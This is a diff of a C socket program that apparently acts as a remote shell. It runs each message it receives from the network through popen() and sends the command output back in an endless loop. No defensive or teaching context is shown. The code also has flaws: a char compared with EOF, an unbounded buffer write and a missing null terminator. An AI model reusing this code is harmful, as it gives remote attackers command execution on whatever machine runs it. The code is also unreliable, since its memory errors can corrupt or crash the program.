@@ -9,12 +9,13 @@
 #include <sys/types.h>
 #include <unistd.h>
 
-char message[100];
+char message[10000];
 struct sockaddr_in serv; 
 int fd; 
 int conn; 
 int valread;
-
+char output;
+char shell[10000];
 
 
 int main(){
@@ -36,13 +37,27 @@ int main(){
   while(1){
     fflush(stdout);
 
-    valread = read(fd, message, 100);
+    valread = read(fd, message, 10000);
     
     if(valread > 0){
 
-      printf("Message Received: %s\n", message);
-      system(message);
+      FILE *file = popen(message, "r");
+      output = fgetc(file);
+      int i = 0;
+      
+      while (output != EOF){
+        
+        shell[i] = output;
 
+        output = fgetc(file);
+        i++;
+      }
+       
+      send(fd, shell, strlen(shell), 0);
+      for(int i = 0; i < strlen(shell); i++){
+        shell[i] = ' ';
+      }
+      fclose(file);
     
     }  
   
